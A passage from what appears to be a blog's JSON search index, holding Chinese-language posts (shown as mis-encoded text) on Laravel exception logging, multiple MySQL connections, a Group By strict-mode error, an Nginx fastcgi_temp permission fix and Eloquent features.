App\\Traits\\ApiResponse;use Exception;/** * ç³»ç»Ÿå†…éƒ¨å¼‚å¸¸ * * Class InternalException * * @package App\\Exceptions */class InternalException extends Exception&#123; private array $doReport = [ \\Exception::class, // æ‰€æœ‰å¼‚å¸¸çš„åŸºç±» \\ErrorException::class, // é”™è¯¯å¼‚å¸¸ ]; /** * InternalException constructor. * * @param string $message * @param int $code */ public function __construct($message = \"ç³»ç»Ÿå†…éƒ¨é”™è¯¯\", $exception = null, $code = 500) &#123; if ($exception) &#123; if (in_array(get_class($exception), $this-&gt;doReport)) &#123; \\Log::error(\"ç³»ç»Ÿå†…éƒ¨å¼‚å¸¸\", [\"exception\" =&gt; $exception]); &#125; &#125; parent::__construct($message, $code); &#125;&#125; è°ƒç”¨å¦‚ä¸‹ï¼š 12345678public function say()&#123; try &#123; // do something &#125; catch (\\Exception $exception) &#123; throw new InternalException($exception-&gt;getMessage(), $exception); &#125;&#125; è¿™æ ·ï¼Œå¦‚æœåé¢å¦‚æœå†æ¬¡é‡åˆ°ç±»ä¼¼çš„é—®é¢˜ï¼Œå°±å¯ä»¥ç›´æ¥å»laravel.log æ–‡ä»¶ä¸­æ‰¾åˆ°å…·ä½“çš„å¼‚å¸¸ä¿¡æ¯äº†ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel è¿æ¥å¤šä¸ª Mysql æ•°æ®åº“","slug":"laravel-connects-to-multiple-mysql-databases","date":"2021-08-18T00:18:42.000Z","updated":"2021-08-18T00:19:17.661Z","comments":true,"path":"laravel-connects-to-multiple-mysql-databases/","link":"","permalink":"https://www.0x2beace.com/laravel-connects-to-multiple-mysql-databases/","excerpt":"åœ¨Laravel é¡¹ç›®é‡Œé¢ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨å¤šä¸ªæ•°æ®åº“ï¼Œå…¶å®æ˜¯å¾ˆç®€å•çš„äº‹æƒ…ã€‚","text":"åœ¨Laravel é¡¹ç›®é‡Œé¢ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨å¤šä¸ªæ•°æ®åº“ï¼Œå…¶å®æ˜¯å¾ˆç®€å•çš„äº‹æƒ…ã€‚ ç¬¬ä¸€æ­¥ï¼Œé¦–å…ˆéœ€è¦åœ¨ .env æ–‡ä»¶ä¸­å®šä¹‰ç¬¬äºŒä¸ªæ•°æ®åº“è¿æ¥ï¼š 123456789101112DB_CONNECTION=mysqlDB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=database_nameDB_USERNAME=rootDB_PASSWORD=DB_HOST_CENTER=127.0.0.1DB_PORT_CENTER=3306DB_DATABASE_CENTER=database_centerDB_USERNAME_CENTER=rootDB_PASSWORD_CENTER= ç¬¬äºŒæ­¥ï¼Œåœ¨ config/database.php æ–‡ä»¶ä¸­é…ç½®ç¬¬äºŒä¸ªæ•°æ®åº“è¿æ¥ï¼š 123456789101112131415161718192021222324252627'mysql' =&gt; [ 'driver' =&gt; 'mysql', 'host' =&gt; env('DB_HOST', 'localhost'), 'port' =&gt; env('DB_PORT', '3306'), 'database' =&gt; env('DB_DATABASE', 'forge'), 'username' =&gt; env('DB_USERNAME', 'forge'), 'password' =&gt; env('DB_PASSWORD', ''), 'charset' =&gt; 'utf8', 'collation' =&gt; 'utf8_unicode_ci', 'prefix' =&gt; '', 'strict' =&gt; false, 'engine' =&gt; null,],'mysql_center' =&gt; [ 'driver' =&gt; 'mysql', 'host' =&gt; env('DB_HOST_CENTER', 'localhost'), 'port' =&gt; env('DB_PORT_CENTER', '3306'), 'database' =&gt; env('DB_DATABASE_CENTER', 'forge'), 'username' =&gt; env('DB_USERNAME_CENTER', 'forge'), 'password' =&gt; env('DB_PASSWORD_CENTER', ''), 'charset' =&gt; 'utf8', 'collation' =&gt; 'utf8_unicode_ci', 'prefix' =&gt; '', 'strict' =&gt; false, 'engine' =&gt; null,], ä½¿ç”¨æ–¹å¼ä¸€åœ¨æ¨¡å‹ä¸­æŒ‡å®šéœ€è¦è¿æ¥çš„æ•°æ®åº“ï¼š 123456789101112131415// å¦‚æœæ²¡æœ‰æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œåˆ™ä¼šä½¿ç”¨é»˜è®¤çš„ mysql è¿æ¥class UserModel extends Model&#123; // æ•°æ®åº“'database'ä¸­çš„usersè¡¨ protected $table = \"users\";&#125;// æŒ‡å®šmysql_center ä½œä¸ºæ•°æ®åº“è¿æ¥class UserModel extends Model&#123; // æ•°æ®åº“'dadtabase_center'ä¸­çš„usersè¡¨ protected $connection = 'mysql_center'; protected $table = \"users\";&#125; è¿™æ ·ï¼Œå½“å†æ¬¡ä½¿ç”¨è¯¥æ¨¡å‹æ—¶ï¼Œå…¶èƒŒåè¿æ¥çš„å°±æ˜¯æ–°çš„æ•°æ®åº“ã€‚ 123UserModel::find(1);// [2021-08-17 21:32:53] DEV.DEBUG: [database_center] [54.96ms] select * from `user` where `uid` = '1' ä½¿ç”¨æ–¹å¼äºŒä¸Šé¢æ˜¯ä¸ºæ¨¡å‹æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•ä¸ºå•ä¸ªæŸ¥è¯¢æŒ‡å®šè¿æ¥ï¼Ÿ ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ ä½¿ç”¨è¯¥æ–¹å¼ä¹‹å‰ï¼Œä¹Ÿéœ€è¦æå‰é…ç½®å¥½éœ€è¦è¿æ¥çš„æ•°æ®åº“ 123$data = DB::connection(\"mysql_center\") -&gt;table(\"user\") -&gt;get(); è¿™æ ·å°±å¯ä»¥åœ¨ä¸æ”¹å˜æ¨¡å‹å±æ€§çš„æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢åˆ°å…¶ä»–æ•°æ®åº“çš„æ•°æ®äº†ã€‚ å‚è€ƒé“¾æ¥ Laravel æ•°æ®åº“ï¼šè¿æ¥å¤šä¸ª MySQL æ•°æ®åº“","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel Group By å¼‚å¸¸è®°å½•","slug":"laravel-uses-group-by-exception-logging","date":"2021-08-14T08:16:53.000Z","updated":"2021-08-14T08:17:30.320Z","comments":true,"path":"laravel-uses-group-by-exception-logging/","link":"","permalink":"https://www.0x2beace.com/laravel-uses-group-by-exception-logging/","excerpt":"å‰æ®µæ—¶é—´ç”¨Laravel åšé¡¹ç›®ï¼Œä½¿ç”¨Group Byæ—¶ï¼Œæ€»æ˜¯ä¼šé‡åˆ°çš„ä¸€ä¸ªé”™è¯¯ï¼Œå…·ä½“å¼‚å¸¸ä¿¡æ¯å¦‚ä¸‹ï¼š","text":"å‰æ®µæ—¶é—´ç”¨Laravel åšé¡¹ç›®ï¼Œä½¿ç”¨Group Byæ—¶ï¼Œæ€»æ˜¯ä¼šé‡åˆ°çš„ä¸€ä¸ªé”™è¯¯ï¼Œå…·ä½“å¼‚å¸¸ä¿¡æ¯å¦‚ä¸‹ï¼š Illuminate\\Database\\QueryException: SQLSTATE[42000]: Syntax error or access violation: 1140 In aggregated query without GROUP BY, expression #2 of SELECT list contains nonaggregated column â€˜database.table.idâ€™; this is incompatible with sql_mode=only_full_group_by è¿™ä¸ªé”™è¯¯å¾ˆçœ¼ç†Ÿï¼Œå…¶åŸå› æ˜¯å¯¹äºèšåˆæ“ä½œï¼ˆå¦‚ï¼šsumã€maxã€minç­‰ï¼‰ï¼Œå¦‚æœåœ¨SELECT ä¸­çš„åˆ—ï¼Œæ²¡æœ‰åœ¨GROUP BYä¸­å‡ºç°ï¼Œé‚£ä¹ˆè¿™ä¸ªSQLæ˜¯ä¸åˆæ³•çš„ï¼Œå› ä¸ºåˆ—ä¸åœ¨GROUP BYä»å¥ä¸­ã€‚ ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯SELECT åé¢æ¥çš„åˆ—å¿…é¡»è¢«GROUP BY åé¢æ¥çš„åˆ—æ‰€åŒ…å«ã€‚ å¯æ˜¯åŒæ ·çš„SQLï¼Œåœ¨æ•°æ®åº“ä¸­æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„ï¼Œä¸ºä»€ä¹ˆåœ¨Laravel ä¸‹å´æ€»æ˜¯ä¼šæŠ¥é”™å‘¢ï¼Ÿ å½“æ—¶ä¹Ÿæ˜¯å› ä¸ºé¡¹ç›®ç´§æ€¥ï¼Œæ²¡å…·ä½“æ·±ç©¶å…¶åŸå› ã€‚ ä»Šå¤©æ— æ„é—´çœ‹åˆ°ä¸€ç¯‡æ–‡ç« â€”â€”Laravelä½¿ç”¨group byæŠ¥é”™çš„é—®é¢˜ï¼Œæ­£å¥½æŠŠè¿™ä¸ªé—®é¢˜ç»™è®²æ˜ç™½äº†ã€‚ åŸæ¥æ˜¯å› ä¸ºå¼€å‘è€…åœ¨Laravel 5.3 ç‰ˆæœ¬åå¢åŠ ä¸€ä¸ªæ•°æ®åº“çš„strict æ¨¡å¼ï¼Œå…¶ä¸­ä¸€ä¸ªå¼€å‘è€…å¯¹äºå¢åŠ è¿™ä¸ªæ¨¡å¼çš„çœ‹æ³•å¾ˆæœ‰æ„æ€ï¼š Adam14Four ï¼šTo be completely honest, I donâ€™t remember exactly what the details were, but it was some sort of data-loss problem.è¯´çœŸçš„ï¼Œæˆ‘ä¹Ÿå¿˜äº†å…·ä½“çš„ç»†èŠ‚äº†ï¼Œå¯èƒ½æ˜¯å› ä¸ºæ•°æ®ä¸¢å¤±æ’åºçš„é—®é¢˜ã€‚ Laravel 8.x ç‰ˆæœ¬ï¼Œé»˜è®¤ä¼šå¯ç”¨è¯¥æ¨¡å¼ï¼Œå¯ç”¨æ—¶ï¼Œä¼šé€ æˆä»¥ä¸‹å½±å“ï¼š fernandobandeiraï¼š1 - Add all columns to group by.group byéœ€è¦æ‰€æœ‰çš„åˆ—ã€‚2 - Wonâ€™t be able to use dateâ€™s such as 0000-00-00 00:00:00.æ—¶é—´ä¸èƒ½ä½¿ç”¨0000-00-00 00:00:00çš„æ•°æ®ã€‚3 - Fields like boolean will throw fatal if you pass something that isnâ€™t a boolean value, like 1, before it would convert it to true and save, with strict it fails.å­—æ®µå¦‚æœæ˜¯booleanç±»å‹ï¼Œä½†æ˜¯ä¼ å…¥ä¸€ä¸ªébooleanå¦‚ã€Œ1ã€å°†ä¼šæŠ›å‡ºä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚åœ¨éstrictæ¨¡å¼ä¸‹ä¼šè‡ªåŠ¨è½¬æ¢æˆtrueå¹¶ä¿å­˜ã€‚4 - Youâ€™ll get an error if you divide a field by 0 (or another field that has 0 as value).å¦‚æœä¸€ä¸ªå­—æ®µé™¤ä»¥0å°†ä¼šå¾—åˆ°ä¸€ä¸ªé”™è¯¯ï¼ˆæˆ–è€…å…¶ä»–æœ‰0å€¼çš„å­—æ®µï¼‰ è§£å†³æ–¹æ¡ˆ1. æœ€ç®€å•çš„æ–¹æ¡ˆï¼Œå…³é—­è¯¥æ¨¡å¼å³å¯ï¼š ç¼–è¾‘/config/database.phpï¼š 123456'connections' =&gt; [ 'mysql' =&gt; [ // ... 'strict' =&gt; false, ],], 2. é…ç½®modes ç¼–è¾‘/config/database.phpï¼š 1234567891011121314'connections' =&gt; [ 'mysql' =&gt; [ // ... 'modes' =&gt; [ 'ONLY_FULL_GROUP_BY', 'STRICT_TRANS_TABLES', 'NO_ZERO_IN_DATE', 'NO_ZERO_DATE', 'ERROR_FOR_DIVISION_BY_ZERO', 'NO_AUTO_CREATE_USER', 'NO_ENGINE_SUBSTITUTION', ], ],], ä¸çŸ¥ä¸ºä½•ï¼ŒéªŒè¯æ­¤æ–¹æ¡ˆæ—¶æ€»æ˜¯æœªç”Ÿæ•ˆã€‚ 3. full group byå¦‚æœä¸æƒ³å…³é—­è¯¥æ¨¡å¼ï¼Œé‚£å°±åªæœ‰ä¸¤ç§é€‰æ‹©äº†ï¼š Full Group Byï¼šSELECT æŸ¥è¯¢çš„å­—æ®µåŒ…å«æ‰€æœ‰çš„Group By çš„å­—æ®µä¸­ ANY_VALUEï¼šè¿™æ˜¯ä¸€ä¸ªMysql çš„å‡½æ•°ï¼Œä½¿ç”¨å®ƒå¯ä»¥ä¸´æ—¶è·³è¿‡ä¸€äº›é”™è¯¯ ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ¡ˆå¹¶ä¸ä¼šâ€œä¸€åŠ³æ°¸é€¸â€ï¼Œä»¥åçš„æ¯ä¸€æ¬¡Group By è¿˜æ˜¯ä¼šé¢ä¸´ç›¸åŒçš„é—®é¢˜ã€‚ å‚è€ƒé“¾æ¥ Laravelä½¿ç”¨group byæŠ¥é”™çš„é—®é¢˜ query that worked in Laravel 5.2 gives me error in Laravel 5.3","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"è®°ä¸€æ¬¡ç”± Nginx fastcgi_temp æƒé™ä¸è¶³å¼•èµ·çš„é—®é¢˜","slug":"note-a-problem-caused-by-insufficient-nginx-fastcgi_temp-permission","date":"2021-08-04T15:13:23.000Z","updated":"2021-08-04T15:18:12.043Z","comments":true,"path":"note-a-problem-caused-by-insufficient-nginx-fastcgi_temp-permission/","link":"","permalink":"https://www.0x2beace.com/note-a-problem-caused-by-insufficient-nginx-fastcgi_temp-permission/","excerpt":"ä»Šå¤©åœ¨æ­£å¼ç¯å¢ƒæ”¶åˆ°åŒäº‹åé¦ˆçš„ä¸€ä¸ªé—®é¢˜ï¼šä¸»é¡µå¯ä»¥æ‰“å¼€ï¼Œä½†æ˜¯éƒ¨åˆ†åˆ—è¡¨å§‹ç»ˆæ— æ³•è®¿é—®ã€‚","text":"ä»Šå¤©åœ¨æ­£å¼ç¯å¢ƒæ”¶åˆ°åŒäº‹åé¦ˆçš„ä¸€ä¸ªé—®é¢˜ï¼šä¸»é¡µå¯ä»¥æ‰“å¼€ï¼Œä½†æ˜¯éƒ¨åˆ†åˆ—è¡¨å§‹ç»ˆæ— æ³•è®¿é—®ã€‚ ä¸€å¼€å§‹ï¼Œæˆ‘ä»¥ä¸ºæ˜¯æ¥å£æŠ›å‡ºå¼‚å¸¸äº†ï¼Œä½†æ˜¯æ‰“å¼€æµè§ˆå™¨æ§åˆ¶å°çœ‹åˆ°å“åº” çŠ¶æ€ä¸ºâ€œ200 OKâ€ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°Console ä¸‹æœ‰ä¸€ä¸ªerrorã€‚ å¼‚å¸¸ä¿¡æ¯ä¸ºï¼šNET::ERR_INCOMPLETE_CHUNKED_ENCODING 200 (OK)ã€‚ è§£å†³è¿‡ç¨‹ç”±Http Status Code å¯ä»¥åˆ¤æ–­å‡ºï¼Œè¿™ä¸ªé”™è¯¯è·Ÿæ¥å£æ²¡æœ‰å…³ç³»ï¼Œæ¥å£å¦‚æœæœ‰é—®é¢˜ï¼ŒçŠ¶æ€ç ä¸€å®šä¸ä¼šæ˜¯ 200 ã€‚ æ—¢ç„¶å’Œæ¥å£æ²¡æœ‰å…³ç³»ï¼Œé‚£å°±æå¯èƒ½æ˜¯æœåŠ¡ç«¯ç¯å¢ƒå¯¼è‡´çš„é—®é¢˜äº†ã€‚ æƒ³æ˜ç™½è¿™ä¸€ç‚¹ä¹‹åï¼Œé©¬ä¸ŠæŸ¥çœ‹Nginx è¿‘æœŸçš„é”™è¯¯æ—¥å¿—ã€‚ 12021&#x2F;08&#x2F;04 14:59:37 [crit] 11712#0: *244402125 open() &quot;&#x2F;www&#x2F;server&#x2F;nginx&#x2F;fastcgi_temp&#x2F;0&#x2F;94&#x2F;0000005940&quot; failed (13: Permission denied) while reading upstream, client: 116.24.95.208, server: api.nwppm.com, request: &quot;POST &#x2F;xxxx&#x2F;xxxx&#x2F;index HTTP&#x2F;1.1&quot;, upstream: &quot;fastcgi:&#x2F;&#x2F;unix:&#x2F;tmp&#x2F;php-cgi-74.sock:&quot;, host: &quot;api.nwppm.com&quot;, referrer: &quot;http:&#x2F;&#x2F;xxxx.xxxx.com&#x2F;&quot; æœç„¶æ²¡çŒœé”™ï¼Œå°±æ˜¯å› ä¸ºæ–‡ä»¶å¤¹æƒé™ä¸è¶³å¼•èµ·çš„å¼‚å¸¸ã€‚ è§£å†³æ–¹æ¡ˆæ‰¾åˆ°åŸå› åå°±å¥½åŠäº†ï¼Œæ—¢ç„¶æ˜¯å› ä¸ºfactcgi_temp æ–‡ä»¶å¤¹æƒé™ä¸è¶³å¼•èµ·çš„ï¼Œé‚£ä¹ˆè§£å†³æ–¹æ¡ˆå°±æ˜¯æ›´æ–°æƒé™ï¼š 1chmod -R 740 /www/server/nginx/fastcgi_temp é—®é¢˜è¿˜åŸé—®é¢˜è™½ç„¶è§£å†³äº†ï¼Œä½†è¿˜ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› é€ æˆçš„ï¼Œå¦‚æœå°±æ­¤æ”¾ä¸‹ï¼Œä¼°è®¡ä»Šæ™šéƒ½ä¼šç¡ä¸ç€è§‰çš„â€¦ åœ¨ææ¸…æ¥šè¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œå…ˆæ¥å›é¡¾ä¸€ä¸‹PHP-FPM ä¸ Nginx çš„åç¨‹æµç¨‹ï¼š å½“å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¯·æ±‚åˆ°æœåŠ¡ç«¯ï¼ŒNginx é¦–å…ˆä¼šåˆ¤æ–­è¯¥è¯·æ±‚æ˜¯é™æ€è¿˜æ˜¯åŠ¨æ€ï¼Ÿ å¦‚æœæ˜¯é™æ€ï¼Œç›´æ¥è¿”å›å¯¹åº”çš„é™æ€èµ„æºã€‚ å¦‚æœæ˜¯åŠ¨æ€ï¼ŒFastCGI ä¼šå°†è¯¥è¯·æ±‚è½¬å‘ç»™æœ¬åœ° 9000 ç«¯å£ï¼ˆ9000 æ˜¯ PHPâ€”FPM æ‰€ç›‘å¬çš„ç«¯å£ï¼‰æˆ–è€… sockã€‚ PHP-FPM ä¸»è¿›ç¨‹æ¥æ”¶åˆ°è¯·æ±‚ä¹‹åï¼Œä¼šåˆ†é…ä¸€ä¸ªç©ºé—²çš„ Worker è¿›ç¨‹å»å¤„ç†è¿™ä¸ªè¯·æ±‚ï¼Œå¤„ç†å®Œæˆä¹‹åå°†æ•°æ®è¿”å›ç»™ FastCGIï¼Œå†ç”± Nginx è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ ä»¥ä¸Šæ˜¯ä¸€ä¸ªå®Œæ•´çš„HTTP è¯·æ±‚å¤„ç†æµç¨‹ã€‚å…¶ä¸­Worker è¿›ç¨‹å¤„ç†å®Œè¯·æ±‚ä¹‹åï¼Œä¼šå°†æ•°æ®è¿”å›ç»™ FastCGIï¼Œå†ç”±Nginx è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè¿™é‡Œå°±ä¸å¾—ä¸æåˆ°Nginx çš„Buffer æœºåˆ¶ï¼š å¯¹äºæ¥è‡ª FastCGI Server çš„ Responseï¼ŒNginx å°†å…¶ç¼“å†²åˆ°å†…å­˜ä¸­ï¼Œç„¶åä¾æ¬¡å‘é€åˆ°å®¢æˆ·ç«¯æµè§ˆå™¨ã€‚ç¼“å†²åŒºçš„å¤§å°ç”± fastcgi_buffers å’Œ fastcgi_buffer_size ä¸¤ä¸ªå€¼æ§åˆ¶ã€‚ ä»¥ä¸‹é¢è¿™ä¸ªé…ç½®è¿›è¡Œè¯´æ˜ï¼š 12fastcgi_buffers 8 4K;fastcgi_buffer_size 4K; fastcgi_buffers æ§åˆ¶ nginx æœ€å¤šåˆ›å»º 8 ä¸ªå¤§å°ä¸º 4K çš„ç¼“å†²åŒº fastcgi_buffer_size åˆ™æ˜¯å¤„ç† Response æ—¶ç¬¬ä¸€ä¸ªç¼“å†²åŒºçš„å¤§å°ï¼Œä¸åŒ…å«åœ¨å‰è€…ä¸­ æ‰€ä»¥æ€»è®¡èƒ½åˆ›å»ºçš„æœ€å¤§å†…å­˜ç¼“å†²åŒºå¤§å°æ˜¯ 84K+4K = 36kã€‚è€Œè¿™äº›ç¼“å†²åŒºæ˜¯æ ¹æ®å®é™…çš„ Response å¤§å°åŠ¨æ€ç”Ÿæˆçš„ï¼Œå¹¶ä¸æ˜¯ä¸€æ¬¡æ€§åˆ›å»ºçš„ã€‚æ¯”å¦‚ä¸€ä¸ª 8K çš„é¡µé¢ï¼ŒNginx ä¼šåˆ›å»º 24K å…± 2 ä¸ª buffersã€‚ å½“ Response å°äºç­‰äº 36k æ—¶ï¼Œæ‰€æœ‰æ•°æ®å½“ç„¶å…¨éƒ¨åœ¨å†…å­˜ä¸­å¤„ç†ã€‚å¦‚æœ Response å¤§äº 36k å‘¢ï¼Ÿfastcgi_temp çš„ä½œç”¨å°±åœ¨äºæ­¤ï¼Œå¤šå‡ºæ¥çš„æ•°æ®ä¼šè¢«ä¸´æ—¶å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œæ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹é¢ã€‚ å‚è€ƒé“¾æ¥ åˆ†æ fastcgi_temp é”™è¯¯ä»¥åŠ Nginx çš„ Buffer æœºåˆ¶","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"Laravel Eloquent é«˜é˜¶ç”¨æ³•æ•´ç†","slug":"laravel-eloquent-advanced-usage","date":"2021-07-27T00:31:56.000Z","updated":"2021-07-27T00:32:42.058Z","comments":true,"path":"laravel-eloquent-advanced-usage/","link":"","permalink":"https://www.0x2beace.com/laravel-eloquent-advanced-usage/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†Laravel Eloquent çš„ä¸€äº›é«˜çº§ç”¨æ³•ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç†Laravel Eloquent çš„ä¸€äº›é«˜çº§ç”¨æ³•ã€‚ hidden/visibleæœ‰æ—¶å¯èƒ½ä¼šé‡åˆ°éœ€è¦éšè—/æ˜¾ç¤ºå±æ€§çš„éœ€æ±‚ï¼Œå°½ç®¡Eloquent ORM ä¸ºæˆ‘ä»¬æä¾›äº†hiddenã€visible å±æ€§ï¼Œä½†å¦‚æœèƒ½åŠ¨æ€è®¾ç½®ï¼Œä¼¼ä¹æ›´ä¸é”™ã€‚ src/Illuminate/Database/Eloquent/Concerns/HidesAttributes.php Tarit ä¸ºæˆ‘ä»¬æä¾›äº†å‡ ä¸ªä¸é”™çš„æ–¹æ³•ï¼š getVisibleï¼šè·å–ç™½åå• setVisibleï¼šè®¾ç½®ç™½åå• makeVisibleï¼šè¿½åŠ ç™½åå• getHiddenï¼šè·å–é»‘åå• setHiddenï¼šè®¾ç½®é»‘åå• makeHiddenï¼šè¿½åŠ é»‘åå• æœ€ä½³å®è·µ1234$user = UserModel::find(1)-&gt;makeHidden([\"remember_token\"]);$user-&gt;remember_token;// obvQx5ZVZAoAVmWwkB-STy8xVPV1 éœ€è¦æ³¨æ„ä¸€ç‚¹çš„æ˜¯ï¼Œè™½ç„¶å±æ€§è¢«æˆ‘ä»¬éšè—äº†ï¼Œä½†å¦‚æœä»éœ€è¦ä½¿ç”¨è¯¥å±æ€§çš„è¯ï¼Œè¿˜æ˜¯å¯ä»¥é€šè¿‡-&gt; è·å–åˆ° Accessorsè¦å®šä¸€ä¸ªAccessorsï¼Œéœ€è¦åœ¨æ¨¡å‹ä¸­åˆ›å»ºä¸€ä¸ªåç§°ä¸ºgetXxxAttribute çš„æ–¹æ³•ï¼Œå…¶ä¸­çš„ Xxx æ˜¯é©¼å³°å‘½åæ³•çš„å­—æ®µåã€‚ é€šè¿‡å±æ€§è·å–å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾åœ°ä¸ºå±æ€§èµ‹äºˆæ–°çš„å€¼ï¼Œä½†å¦‚æœæƒ³è¦è·å–èµ‹å€¼ä¹‹å‰çš„å€¼ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•åšå‘¢ï¼Ÿ 1234567/** * @return string */public function getContentAttribute($value)&#123; return strip_tags($value);&#125; src/Illuminate/Database/Eloquent/Concerns/HasAttributes.php Tarit ä¸ºæˆ‘ä»¬æä¾›äº†å‡ ä¸ªä¸é”™çš„æ–¹æ³•ï¼š getAttributesï¼šè·å–èµ‹å€¼ä¹‹å‰çš„å€¼ getAttributeï¼šè·å–æŒ‡å®šKeyï¼Œä¿®é¥°ä¹‹åçš„å€¼ getAttributeValueï¼šè·å–æŒ‡å®šKeyï¼Œä¿®é¥°ä¹‹åçš„å€¼ setAttributeï¼šä¸ºå±æ€§èµ‹å€¼ getMutatedAttributesï¼šè·å–éœ€è¦èµ‹å€¼çš„Key éœ€è¦æ³¨æ„çš„æ˜¯ï¼šä»¥ä¸Šè¿™äº›Api ä»…é€‚ç”¨äºæ¨¡å‹çš„å®ä¾‹å¯¹è±¡ï¼Œå¯¹äºé›†åˆä¸èƒ½ç›´æ¥ä½¿ç”¨ 123UserModel::find(1)-&gt;getAttributes(); âœ…UserModel::get()-&gt;getAttributes(); â æœ€ä½³å®è·µ12345$notice = NoticeModel::find(1);$notice-&gt;content; // Hello World$notice-&gt;getAttribute(\"content\"); // &lt;p&gt;Hello World&lt;/p&gt; åˆ†é¡µæ•°æ®åˆ†é¡µæœ‰å¤šç§æ–¹æ³•ï¼Œæœ€ç®€å•çš„æ˜¯ä½¿ç”¨ æŸ¥è¯¢æ„é€ å™¨ æˆ– Eloquent query çš„ paginate æ–¹æ³•ã€‚ ä½†æœ‰äº›æ—¶å€™ï¼Œå› ä¸ºä¸€äº›åŸå› ï¼Œæˆ‘ä»¬ä¸æƒ³ä½¿ç”¨ paginate è‡ªåŠ¨åˆ›å»ºåˆ†é¡µï¼Œé‚£æœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥æ‰‹åŠ¨åˆ›å»ºåˆ†é¡µå‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯æœ‰çš„ï¼ŒLaravel æä¾›ä»¥ä¸‹ä¸¤ç§æ–¹å¼ï¼š Illuminate\\Pagination\\Paginatorï¼šç›¸å½“äºæŸ¥è¯¢æ„é€ å™¨æˆ– Eloquent çš„ simplePaginate æ–¹æ³•ã€‚ Illuminate\\Pagination\\LengthAwarePaginatorï¼šç›¸å½“äºæŸ¥è¯¢æ„é€ å™¨æˆ– Eloquent çš„ paginate æ–¹æ³•ã€‚ æœ€ä½³å®è·µ123456789UserModel::where(\"age\", \"&gt;\", 18)-&gt;paginate(15);// ç­‰æ•ˆäº$data = UserModel::where(\"age\", \"&gt;\", 18)-&gt;get();new LengthAwarePaginator($data, $data-&gt;count(), 15);// ç­‰æ•ˆäº$data = UserModel::where(\"age\", \"&gt;\", 18)-&gt;get();new Paginator($data, 15);","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Mysql å¦‚ä½•è‡ªå®šä¹‰æ’åº","slug":"how-to-customize-sorting-in-mysql","date":"2021-07-26T00:27:30.000Z","updated":"2021-07-26T00:28:37.073Z","comments":true,"path":"how-to-customize-sorting-in-mysql/","link":"","permalink":"https://www.0x2beace.com/how-to-customize-sorting-in-mysql/","excerpt":"åœ¨Mysql ä¸­ï¼Œæƒ³è¦å¯¹ç»“æœè¿›è¡Œæ’åºï¼Œé€šå¸¸ä¼šä½¿ç”¨Order By å­å¥ï¼Œä½¿ç”¨æ—¶ï¼Œåº”æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š åœ¨Order By å­å¥ä¸­ï¼Œä½¿ç”¨ ASC æˆ– DESC å…³é”®å­—æ¥è®¾ç½®æŸ¥è¯¢ç»“æœæ˜¯æŒ‰å‡åºæˆ–é™åºæ’åˆ—; é»˜è®¤æŒ‰å‡åºï¼ˆASCï¼‰æ’åˆ— Order By å­å¥å¯ä»¥æŒ‡å®šå¤šä¸ªæ’åºé”® 